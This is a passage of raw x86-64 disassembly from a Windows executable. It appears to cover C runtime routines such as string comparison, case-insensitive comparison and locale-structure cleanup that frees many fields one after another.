   14000b2c6:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000b2ca:	41 0f ba f4 1f       	btr    $0x1f,%r12d
   14000b2cf:	4c 8d 4d ef          	lea    -0x11(%rbp),%r9
   14000b2d3:	41 8b d4             	mov    %r12d,%edx
   14000b2d6:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   14000b2dd:	00 
   14000b2de:	e8 c9 f7 ff ff       	call   0x14000aaac
   14000b2e3:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b2e7:	75 34                	jne    0x14000b31d
   14000b2e9:	ff 15 a1 5d 00 00    	call   *0x5da1(%rip)        # 0x140011090
   14000b2ef:	8b c8                	mov    %eax,%ecx
   14000b2f1:	e8 32 92 ff ff       	call   0x140004528
   14000b2f6:	48 63 0b             	movslq (%rbx),%rcx
   14000b2f9:	48 8b c1             	mov    %rcx,%rax
   14000b2fc:	83 e1 1f             	and    $0x1f,%ecx
   14000b2ff:	48 c1 f8 05          	sar    $0x5,%rax
   14000b303:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   14000b307:	49 8b 44 c5 00       	mov    0x0(%r13,%rax,8),%rax
   14000b30c:	80 64 08 08 fe       	andb   $0xfe,0x8(%rax,%rcx,1)
   14000b311:	8b 0b                	mov    (%rbx),%ecx
   14000b313:	e8 c4 d1 ff ff       	call   0x1400084dc
   14000b318:	e9 7c fb ff ff       	jmp    0x14000ae99
   14000b31d:	48 63 13             	movslq (%rbx),%rdx
   14000b320:	48 8b ca             	mov    %rdx,%rcx
   14000b323:	83 e2 1f             	and    $0x1f,%edx
   14000b326:	48 c1 f9 05          	sar    $0x5,%rcx
   14000b32a:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   14000b32e:	49 8b 4c cd 00       	mov    0x0(%r13,%rcx,8),%rcx
   14000b333:	48 89 04 0a          	mov    %rax,(%rdx,%rcx,1)
   14000b337:	8b c7                	mov    %edi,%eax
   14000b339:	e9 1e f9 ff ff       	jmp    0x14000ac5c
   14000b33e:	45 33 c9             	xor    %r9d,%r9d
   14000b341:	45 33 c0             	xor    %r8d,%r8d
   14000b344:	33 d2                	xor    %edx,%edx
   14000b346:	33 c9                	xor    %ecx,%ecx
   14000b348:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000b34d:	e8 f6 8d ff ff       	call   0x140004148
   14000b352:	cc                   	int3
   14000b353:	cc                   	int3
   14000b354:	cc                   	int3
   14000b355:	cc                   	int3
   14000b356:	cc                   	int3
   14000b357:	cc                   	int3
   14000b358:	cc                   	int3
   14000b359:	cc                   	int3
   14000b35a:	cc                   	int3
   14000b35b:	cc                   	int3
   14000b35c:	cc                   	int3
   14000b35d:	cc                   	int3
   14000b35e:	cc                   	int3
   14000b35f:	cc                   	int3
   14000b360:	cc                   	int3
   14000b361:	cc                   	int3
   14000b362:	cc                   	int3
   14000b363:	cc                   	int3
   14000b364:	cc                   	int3
   14000b365:	cc                   	int3
   14000b366:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000b36d:	00 00 00 
   14000b370:	48 2b d1             	sub    %rcx,%rdx
   14000b373:	4d 85 c0             	test   %r8,%r8
   14000b376:	74 6a                	je     0x14000b3e2
   14000b378:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   14000b37e:	74 1d                	je     0x14000b39d
   14000b380:	0f b6 01             	movzbl (%rcx),%eax
   14000b383:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   14000b386:	75 5d                	jne    0x14000b3e5
   14000b388:	48 ff c1             	inc    %rcx
   14000b38b:	49 ff c8             	dec    %r8
   14000b38e:	74 52                	je     0x14000b3e2
   14000b390:	84 c0                	test   %al,%al
   14000b392:	74 4e                	je     0x14000b3e2
   14000b394:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   14000b39b:	75 e3                	jne    0x14000b380
   14000b39d:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   14000b3a4:	80 80 80 
   14000b3a7:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   14000b3ae:	fe fe fe 
   14000b3b1:	8d 04 11             	lea    (%rcx,%rdx,1),%eax
   14000b3b4:	25 ff 0f 00 00       	and    $0xfff,%eax
   14000b3b9:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   14000b3be:	77 c0                	ja     0x14000b380
   14000b3c0:	48 8b 01             	mov    (%rcx),%rax
   14000b3c3:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   14000b3c7:	75 b7                	jne    0x14000b380
   14000b3c9:	48 83 c1 08          	add    $0x8,%rcx
   14000b3cd:	49 83 e8 08          	sub    $0x8,%r8
   14000b3d1:	76 0f                	jbe    0x14000b3e2
   14000b3d3:	4e 8d 0c 10          	lea    (%rax,%r10,1),%r9
   14000b3d7:	48 f7 d0             	not    %rax
   14000b3da:	49 23 c1             	and    %r9,%rax
   14000b3dd:	49 85 c3             	test   %rax,%r11
   14000b3e0:	74 cf                	je     0x14000b3b1
   14000b3e2:	33 c0                	xor    %eax,%eax
   14000b3e4:	c3                   	ret
   14000b3e5:	48 1b c0             	sbb    %rax,%rax
   14000b3e8:	48 83 c8 01          	or     $0x1,%rax
   14000b3ec:	c3                   	ret
   14000b3ed:	cc                   	int3
   14000b3ee:	cc                   	int3
   14000b3ef:	cc                   	int3
   14000b3f0:	4c 8b d1             	mov    %rcx,%r10
   14000b3f3:	4d 85 c0             	test   %r8,%r8
   14000b3f6:	74 3b                	je     0x14000b433
   14000b3f8:	45 0f b6 0a          	movzbl (%r10),%r9d
   14000b3fc:	49 ff c2             	inc    %r10
   14000b3ff:	41 8d 41 bf          	lea    -0x41(%r9),%eax
   14000b403:	83 f8 19             	cmp    $0x19,%eax
   14000b406:	77 04                	ja     0x14000b40c
   14000b408:	41 83 c1 20          	add    $0x20,%r9d
   14000b40c:	0f b6 0a             	movzbl (%rdx),%ecx
   14000b40f:	48 ff c2             	inc    %rdx
   14000b412:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000b415:	83 f8 19             	cmp    $0x19,%eax
   14000b418:	77 03                	ja     0x14000b41d
   14000b41a:	83 c1 20             	add    $0x20,%ecx
   14000b41d:	49 ff c8             	dec    %r8
   14000b420:	74 0a                	je     0x14000b42c
   14000b422:	45 85 c9             	test   %r9d,%r9d
   14000b425:	74 05                	je     0x14000b42c
   14000b427:	44 3b c9             	cmp    %ecx,%r9d
   14000b42a:	74 cc                	je     0x14000b3f8
   14000b42c:	44 2b c9             	sub    %ecx,%r9d
   14000b42f:	41 8b c1             	mov    %r9d,%eax
   14000b432:	c3                   	ret
   14000b433:	33 c0                	xor    %eax,%eax
   14000b435:	c3                   	ret
   14000b436:	cc                   	int3
   14000b437:	cc                   	int3
   14000b438:	48 83 ec 28          	sub    $0x28,%rsp
   14000b43c:	83 3d ed 07 01 00 00 	cmpl   $0x0,0x107ed(%rip)        # 0x14001bc30
   14000b443:	75 36                	jne    0x14000b47b
   14000b445:	48 85 c9             	test   %rcx,%rcx
   14000b448:	75 1a                	jne    0x14000b464
   14000b44a:	e8 29 91 ff ff       	call   0x140004578
   14000b44f:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b455:	e8 ce 8c ff ff       	call   0x140004128
   14000b45a:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000b45f:	48 83 c4 28          	add    $0x28,%rsp
   14000b463:	c3                   	ret
   14000b464:	48 85 d2             	test   %rdx,%rdx
   14000b467:	74 e1                	je     0x14000b44a
   14000b469:	49 81 f8 ff ff ff 7f 	cmp    $0x7fffffff,%r8
   14000b470:	77 d8                	ja     0x14000b44a
   14000b472:	48 83 c4 28          	add    $0x28,%rsp
   14000b476:	e9 75 ff ff ff       	jmp    0x14000b3f0
   14000b47b:	45 33 c9             	xor    %r9d,%r9d
   14000b47e:	48 83 c4 28          	add    $0x28,%rsp
   14000b482:	e9 01 00 00 00       	jmp    0x14000b488
   14000b487:	cc                   	int3
   14000b488:	48 8b c4             	mov    %rsp,%rax
   14000b48b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000b48f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000b493:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000b497:	57                   	push   %rdi
   14000b498:	48 83 ec 40          	sub    $0x40,%rsp
   14000b49c:	49 8b e8             	mov    %r8,%rbp
   14000b49f:	48 8b fa             	mov    %rdx,%rdi
   14000b4a2:	48 8b f1             	mov    %rcx,%rsi
   14000b4a5:	4d 85 c0             	test   %r8,%r8
   14000b4a8:	0f 84 9c 00 00 00    	je     0x14000b54a
   14000b4ae:	48 8d 48 d8          	lea    -0x28(%rax),%rcx
   14000b4b2:	49 8b d1             	mov    %r9,%rdx
   14000b4b5:	e8 82 9a ff ff       	call   0x140004f3c
   14000b4ba:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   14000b4bf:	48 85 f6             	test   %rsi,%rsi
   14000b4c2:	74 0a                	je     0x14000b4ce
   14000b4c4:	48 85 ff             	test   %rdi,%rdi
   14000b4c7:	74 05                	je     0x14000b4ce
   14000b4c9:	48 3b eb             	cmp    %rbx,%rbp
   14000b4cc:	76 12                	jbe    0x14000b4e0
   14000b4ce:	e8 a5 90 ff ff       	call   0x140004578
   14000b4d3:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b4d9:	e8 4a 8c ff ff       	call   0x140004128
   14000b4de:	eb 53                	jmp    0x14000b533
   14000b4e0:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000b4e5:	48 83 b8 38 01 00 00 	cmpq   $0x0,0x138(%rax)
   14000b4ec:	00 
   14000b4ed:	75 12                	jne    0x14000b501
   14000b4ef:	4c 8b c5             	mov    %rbp,%r8
   14000b4f2:	48 8b d7             	mov    %rdi,%rdx
   14000b4f5:	48 8b ce             	mov    %rsi,%rcx
   14000b4f8:	e8 f3 fe ff ff       	call   0x14000b3f0
   14000b4fd:	8b d8                	mov    %eax,%ebx
   14000b4ff:	eb 32                	jmp    0x14000b533
   14000b501:	48 2b f7             	sub    %rdi,%rsi
   14000b504:	0f b6 0c 3e          	movzbl (%rsi,%rdi,1),%ecx
   14000b508:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000b50d:	e8 f6 18 00 00       	call   0x14000ce08
   14000b512:	0f b6 0f             	movzbl (%rdi),%ecx
   14000b515:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000b51a:	8b d8                	mov    %eax,%ebx
   14000b51c:	e8 e7 18 00 00       	call   0x14000ce08
   14000b521:	48 ff c7             	inc    %rdi
   14000b524:	48 ff cd             	dec    %rbp
   14000b527:	74 08                	je     0x14000b531
   14000b529:	85 db                	test   %ebx,%ebx
   14000b52b:	74 04                	je     0x14000b531
   14000b52d:	3b d8                	cmp    %eax,%ebx
   14000b52f:	74 d3                	je     0x14000b504
   14000b531:	2b d8                	sub    %eax,%ebx
   14000b533:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000b538:	74 0c                	je     0x14000b546
   14000b53a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000b53f:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   14000b546:	8b c3                	mov    %ebx,%eax
   14000b548:	eb 02                	jmp    0x14000b54c
   14000b54a:	33 c0                	xor    %eax,%eax
   14000b54c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000b551:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000b556:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000b55b:	48 83 c4 40          	add    $0x40,%rsp
   14000b55f:	5f                   	pop    %rdi
   14000b560:	c3                   	ret
   14000b561:	cc                   	int3
   14000b562:	cc                   	int3
   14000b563:	cc                   	int3
   14000b564:	48 85 c9             	test   %rcx,%rcx
   14000b567:	0f 84 00 01 00 00    	je     0x14000b66d
   14000b56d:	53                   	push   %rbx
   14000b56e:	48 83 ec 20          	sub    $0x20,%rsp
   14000b572:	48 8b d9             	mov    %rcx,%rbx
   14000b575:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   14000b579:	48 3b 0d 58 ec 00 00 	cmp    0xec58(%rip),%rcx        # 0x14001a1d8
   14000b580:	74 05                	je     0x14000b587
   14000b582:	e8 0d 82 ff ff       	call   0x140003794
   14000b587:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000b58b:	48 3b 0d 4e ec 00 00 	cmp    0xec4e(%rip),%rcx        # 0x14001a1e0
   14000b592:	74 05                	je     0x14000b599
   14000b594:	e8 fb 81 ff ff       	call   0x140003794
   14000b599:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000b59d:	48 3b 0d 44 ec 00 00 	cmp    0xec44(%rip),%rcx        # 0x14001a1e8
   14000b5a4:	74 05                	je     0x14000b5ab
   14000b5a6:	e8 e9 81 ff ff       	call   0x140003794
   14000b5ab:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000b5af:	48 3b 0d 3a ec 00 00 	cmp    0xec3a(%rip),%rcx        # 0x14001a1f0
   14000b5b6:	74 05                	je     0x14000b5bd
   14000b5b8:	e8 d7 81 ff ff       	call   0x140003794
   14000b5bd:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000b5c1:	48 3b 0d 30 ec 00 00 	cmp    0xec30(%rip),%rcx        # 0x14001a1f8
   14000b5c8:	74 05                	je     0x14000b5cf
   14000b5ca:	e8 c5 81 ff ff       	call   0x140003794
   14000b5cf:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000b5d3:	48 3b 0d 26 ec 00 00 	cmp    0xec26(%rip),%rcx        # 0x14001a200
   14000b5da:	74 05                	je     0x14000b5e1
   14000b5dc:	e8 b3 81 ff ff       	call   0x140003794
   14000b5e1:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   14000b5e5:	48 3b 0d 1c ec 00 00 	cmp    0xec1c(%rip),%rcx        # 0x14001a208
   14000b5ec:	74 05                	je     0x14000b5f3
   14000b5ee:	e8 a1 81 ff ff       	call   0x140003794
   14000b5f3:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000b5f7:	48 3b 0d 2a ec 00 00 	cmp    0xec2a(%rip),%rcx        # 0x14001a228
   14000b5fe:	74 05                	je     0x14000b605
   14000b600:	e8 8f 81 ff ff       	call   0x140003794
   14000b605:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   14000b609:	48 3b 0d 20 ec 00 00 	cmp    0xec20(%rip),%rcx        # 0x14001a230
   14000b610:	74 05                	je     0x14000b617
   14000b612:	e8 7d 81 ff ff       	call   0x140003794
   14000b617:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   14000b61b:	48 3b 0d 16 ec 00 00 	cmp    0xec16(%rip),%rcx        # 0x14001a238
   14000b622:	74 05                	je     0x14000b629
   14000b624:	e8 6b 81 ff ff       	call   0x140003794
   14000b629:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000b630:	48 3b 0d 09 ec 00 00 	cmp    0xec09(%rip),%rcx        # 0x14001a240
   14000b637:	74 05                	je     0x14000b63e
   14000b639:	e8 56 81 ff ff       	call   0x140003794
   14000b63e:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   14000b645:	48 3b 0d fc eb 00 00 	cmp    0xebfc(%rip),%rcx        # 0x14001a248
   14000b64c:	74 05                	je     0x14000b653
   14000b64e:	e8 41 81 ff ff       	call   0x140003794
   14000b653:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   14000b65a:	48 3b 0d ef eb 00 00 	cmp    0xebef(%rip),%rcx        # 0x14001a250
   14000b661:	74 05                	je     0x14000b668
   14000b663:	e8 2c 81 ff ff       	call   0x140003794
   14000b668:	48 83 c4 20          	add    $0x20,%rsp
   14000b66c:	5b                   	pop    %rbx
   14000b66d:	c3                   	ret
   14000b66e:	cc                   	int3
   14000b66f:	cc                   	int3
   14000b670:	48 85 c9             	test   %rcx,%rcx
   14000b673:	74 66                	je     0x14000b6db
   14000b675:	53                   	push   %rbx
   14000b676:	48 83 ec 20          	sub    $0x20,%rsp
   14000b67a:	48 8b d9             	mov    %rcx,%rbx
   14000b67d:	48 8b 09             	mov    (%rcx),%rcx
   14000b680:	48 3b 0d 39 eb 00 00 	cmp    0xeb39(%rip),%rcx        # 0x14001a1c0
   14000b687:	74 05                	je     0x14000b68e
   14000b689:	e8 06 81 ff ff       	call   0x140003794
   14000b68e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000b692:	48 3b 0d 2f eb 00 00 	cmp    0xeb2f(%rip),%rcx        # 0x14001a1c8
   14000b699:	74 05                	je     0x14000b6a0
   14000b69b:	e8 f4 80 ff ff       	call   0x140003794
   14000b6a0:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000b6a4:	48 3b 0d 25 eb 00 00 	cmp    0xeb25(%rip),%rcx        # 0x14001a1d0
   14000b6ab:	74 05                	je     0x14000b6b2
   14000b6ad:	e8 e2 80 ff ff       	call   0x140003794
   14000b6b2:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   14000b6b6:	48 3b 0d 5b eb 00 00 	cmp    0xeb5b(%rip),%rcx        # 0x14001a218
   14000b6bd:	74 05                	je     0x14000b6c4
   14000b6bf:	e8 d0 80 ff ff       	call   0x140003794
   14000b6c4:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   14000b6c8:	48 3b 0d 51 eb 00 00 	cmp    0xeb51(%rip),%rcx        # 0x14001a220
   14000b6cf:	74 05                	je     0x14000b6d6
   14000b6d1:	e8 be 80 ff ff       	call   0x140003794
   14000b6d6:	48 83 c4 20          	add    $0x20,%rsp
   14000b6da:	5b                   	pop    %rbx
   14000b6db:	c3                   	ret
   14000b6dc:	48 85 c9             	test   %rcx,%rcx
   14000b6df:	0f 84 f0 03 00 00    	je     0x14000bad5
   14000b6e5:	53                   	push   %rbx
   14000b6e6:	48 83 ec 20          	sub    $0x20,%rsp
   14000b6ea:	48 8b d9             	mov    %rcx,%rbx
   14000b6ed:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000b6f1:	e8 9e 80 ff ff       	call   0x140003794
   14000b6f6:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000b6fa:	e8 95 80 ff ff       	call   0x140003794
   14000b6ff:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000b703:	e8 8c 80 ff ff       	call   0x140003794
   14000b708:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000b70c:	e8 83 80 ff ff       	call   0x140003794
   14000b711:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000b715:	e8 7a 80 ff ff       	call   0x140003794
   14000b71a:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000b71e:	e8 71 80 ff ff       	call   0x140003794
   14000b723:	48 8b 0b             	mov    (%rbx),%rcx
   14000b726:	e8 69 80 ff ff       	call   0x140003794
   14000b72b:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000b72f:	e8 60 80 ff ff       	call   0x140003794
   14000b734:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   14000b738:	e8 57 80 ff ff       	call   0x140003794
   14000b73d:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   14000b741:	e8 4e 80 ff ff       	call   0x140003794
   14000b746:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   14000b74a:	e8 45 80 ff ff       	call   0x140003794
   14000b74f:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   14000b753:	e8 3c 80 ff ff       	call   0x140003794
   14000b758:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000b75c:	e8 33 80 ff ff       	call   0x140003794
   14000b761:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000b765:	e8 2a 80 ff ff       	call   0x140003794
   14000b76a:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   14000b76e:	e8 21 80 ff ff       	call   0x140003794
   14000b773:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   14000b777:	e8 18 80 ff ff       	call   0x140003794
   14000b77c:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000b783:	e8 0c 80 ff ff       	call   0x140003794
   14000b788:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   14000b78f:	e8 00 80 ff ff       	call   0x140003794
   14000b794:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   14000b79b:	e8 f4 7f ff ff       	call   0x140003794
   14000b7a0:	48 8b 8b 98 00 00 00 	mov    0x98(%rbx),%rcx
   14000b7a7:	e8 e8 7f ff ff       	call   0x140003794
   14000b7ac:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   14000b7b3:	e8 dc 7f ff ff       	call   0x140003794
   14000b7b8:	48 8b 8b a8 00 00 00 	mov    0xa8(%rbx),%rcx
   14000b7bf:	e8 d0 7f ff ff       	call   0x140003794
   14000b7c4:	48 8b 8b b0 00 00 00 	mov    0xb0(%rbx),%rcx
   14000b7cb:	e8 c4 7f ff ff       	call   0x140003794
   14000b7d0:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   14000b7d7:	e8 b8 7f ff ff       	call   0x140003794
   14000b7dc:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   14000b7e3:	e8 ac 7f ff ff       	call   0x140003794
   14000b7e8:	48 8b 8b c8 00 00 00 	mov    0xc8(%rbx),%rcx
   14000b7ef:	e8 a0 7f ff ff       	call   0x140003794
   14000b7f4:	48 8b 8b d0 00 00 00 	mov    0xd0(%rbx),%rcx
   14000b7fb:	e8 94 7f ff ff       	call   0x140003794
   14000b800:	48 8b 8b d8 00 00 00 	mov    0xd8(%rbx),%rcx
   14000b807:	e8 88 7f ff ff       	call   0x140003794
   14000b80c:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   14000b813:	e8 7c 7f ff ff       	call   0x140003794
   14000b818:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   14000b81f:	e8 70 7f ff ff       	call   0x140003794
   14000b824:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   14000b82b:	e8 64 7f ff ff       	call   0x140003794
   14000b830:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000b837:	e8 58 7f ff ff       	call   0x140003794
   14000b83c:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   14000b843:	e8 4c 7f ff ff       	call   0x140003794
   14000b848:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   14000b84f:	e8 40 7f ff ff       	call   0x140003794
   14000b854:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000b85b:	e8 34 7f ff ff       	call   0x140003794
   14000b860:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   14000b867:	e8 28 7f ff ff       	call   0x140003794
   14000b86c:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   14000b873:	e8 1c 7f ff ff       	call   0x140003794
   14000b878:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   14000b87f:	e8 10 7f ff ff       	call   0x140003794
   14000b884:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   14000b88b:	e8 04 7f ff ff       	call   0x140003794
   14000b890:	48 8b 8b 38 01 00 00 	mov    0x138(%rbx),%rcx
   14000b897:	e8 f8 7e ff ff       	call   0x140003794
   14000b89c:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   14000b8a3:	e8 ec 7e ff ff       	call   0x140003794
   14000b8a8:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   14000b8af:	e8 e0 7e ff ff       	call   0x140003794
   14000b8b4:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   14000b8bb:	e8 d4 7e ff ff       	call   0x140003794
   14000b8c0:	48 8b 8b 68 01 00 00 	mov    0x168(%rbx),%rcx
   14000b8c7:	e8 c8 7e ff ff       	call   0x140003794
   14000b8cc:	48 8b 8b 70 01 00 00 	mov    0x170(%rbx),%rcx
   14000b8d3:	e8 bc 7e ff ff       	call   0x140003794
   14000b8d8:	48 8b 8b 78 01 00 00 	mov    0x178(%rbx),%rcx
   14000b8df:	e8 b0 7e ff ff       	call   0x140003794
   14000b8e4:	48 8b 8b 80 01 00 00 	mov    0x180(%rbx),%rcx
   14000b8eb:	e8 a4 7e ff ff       	call   0x140003794
   14000b8f0:	48 8b 8b 88 01 00 00 	mov    0x188(%rbx),%rcx
   14000b8f7:	e8 98 7e ff ff       	call   0x140003794
   14000b8fc:	48 8b 8b 90 01 00 00 	mov    0x190(%rbx),%rcx
   14000b903:	e8 8c 7e ff ff       	call   0x140003794
   14000b908:	48 8b 8b 60 01 00 00 	mov    0x160(%rbx),%rcx
   14000b90f:	e8 80 7e ff ff       	call   0x140003794
   14000b914:	48 8b 8b a0 01 00 00 	mov    0x1a0(%rbx),%rcx
   14000b91b:	e8 74 7e ff ff       	call   0x140003794
   14000b920:	48 8b 8b a8 01 00 00 	mov    0x1a8(%rbx),%rcx
   14000b927:	e8 68 7e ff ff       	call   0x140003794
   14000b92c:	48 8b 8b b0 01 00 00 	mov    0x1b0(%rbx),%rcx
   14000b933:	e8 5c 7e ff ff       	call   0x140003794
   14000b938:	48 8b 8b b8 01 00 00 	mov    0x1b8(%rbx),%rcx
   14000b93f:	e8 50 7e ff ff       	call   0x140003794
   14000b944:	48 8b 8b c0 01 00 00 	mov    0x1c0(%rbx),%rcx
   14000b94b:	e8 44 7e ff ff       	call   0x140003794
   14000b950:	48 8b 8b c8 01 00 00 	mov    0x1c8(%rbx),%rcx
   14000b957:	e8 38 7e ff ff       	call   0x140003794
   14000b95c:	48 8b 8b 98 01 00 00 	mov    0x198(%rbx),%rcx
   14000b963:	e8 2c 7e ff ff       	call   0x140003794
   14000b968:	48 8b 8b d0 01 00 00 	mov    0x1d0(%rbx),%rcx
   14000b96f:	e8 20 7e ff ff       	call   0x140003794
   14000b974:	48 8b 8b d8 01 00 00 	mov    0x1d8(%rbx),%rcx
   14000b97b:	e8 14 7e ff ff       	call   0x140003794
   14000b980:	48 8b 8b e0 01 00 00 	mov    0x1e0(%rbx),%rcx
   14000b987:	e8 08 7e ff ff       	call   0x140003794
   14000b98c:	48 8b 8b e8 01 00 00 	mov    0x1e8(%rbx),%rcx
   14000b993:	e8 fc 7d ff ff       	call   0x140003794
   14000b998:	48 8b 8b f0 01 00 00 	mov    0x1f0(%rbx),%rcx
   14000b99f:	e8 f0 7d ff ff       	call   0x140003794
   14000b9a4:	48 8b 8b f8 01 00 00 	mov    0x1f8(%rbx),%rcx
   14000b9ab:	e8 e4 7d ff ff       	call   0x140003794
   14000b9b0:	48 8b 8b 00 02 00 00 	mov    0x200(%rbx),%rcx
   14000b9b7:	e8 d8 7d ff ff       	call   0x140003794
   14000b9bc:	48 8b 8b 08 02 00 00 	mov    0x208(%rbx),%rcx
   14000b9c3:	e8 cc 7d ff ff       	call   0x140003794
   14000b9c8:	48 8b 8b 10 02 00 00 	mov    0x210(%rbx),%rcx
   14000b9cf:	e8 c0 7d ff ff       	call   0x140003794
   14000b9d4:	48 8b 8b 18 02 00 00 	mov    0x218(%rbx),%rcx
   14000b9db:	e8 b4 7d ff ff       	call   0x140003794
   14000b9e0:	48 8b 8b 20 02 00 00 	mov    0x220(%rbx),%rcx
   14000b9e7:	e8 a8 7d ff ff       	call   0x140003794
   14000b9ec:	48 8b 8b 28 02 00 00 	mov    0x228(%rbx),%rcx
   14000b9f3:	e8 9c 7d ff ff       	call   0x140003794
   14000b9f8:	48 8b 8b 30 02 00 00 	mov    0x230(%rbx),%rcx
   14000b9ff:	e8 90 7d ff ff       	call   0x140003794
   14000ba04:	48 8b 8b 38 02 00 00 	mov    0x238(%rbx),%rcx
   14000ba0b:	e8 84 7d ff ff       	call   0x140003794
   14000ba10:	48 8b 8b 40 02 00 00 	mov    0x240(%rbx),%rcx
   14000ba17:	e8 78 7d ff ff       	call   0x140003794
   14000ba1c:	48 8b 8b 48 02 00 00 	mov    0x248(%rbx),%rcx
   14000ba23:	e8 6c 7d ff ff       	call   0x140003794
   14000ba28:	48 8b 8b 50 02 00 00 	mov    0x250(%rbx),%rcx
   14000ba2f:	e8 60 7d ff ff       	call   0x140003794
   14000ba34:	48 8b 8b 58 02 00 00 	mov    0x258(%rbx),%rcx
   14000ba3b:	e8 54 7d ff ff       	call   0x140003794
   14000ba40:	48 8b 8b 60 02 00 00 	mov    0x260(%rbx),%rcx
   14000ba47:	e8 48 7d ff ff       	call   0x140003794
   14000ba4c:	48 8b 8b 68 02 00 00 	mov    0x268(%rbx),%rcx
   14000ba53:	e8 3c 7d ff ff       	call   0x140003794
   14000ba58:	48 8b 8b 70 02 00 00 	mov    0x270(%rbx),%rcx
   14000ba5f:	e8 30 7d ff ff       	call   0x140003794
   14000ba64:	48 8b 8b 78 02 00 00 	mov    0x278(%rbx),%rcx
   14000ba6b:	e8 24 7d ff ff       	call   0x140003794
   14000ba70:	48 8b 8b 80 02 00 00 	mov    0x280(%rbx),%rcx
   14000ba77:	e8 18 7d ff ff       	call   0x140003794
   14000ba7c:	48 8b 8b 88 02 00 00 	mov    0x288(%rbx),%rcx
   14000ba83:	e8 0c 7d ff ff       	call   0x140003794
   14000ba88:	48 8b 8b 90 02 00 00 	mov    0x290(%rbx),%rcx
   14000ba8f:	e8 00 7d ff ff       	call   0x140003794
   14000ba94:	48 8b 8b 98 02 00 00 	mov    0x298(%rbx),%rcx
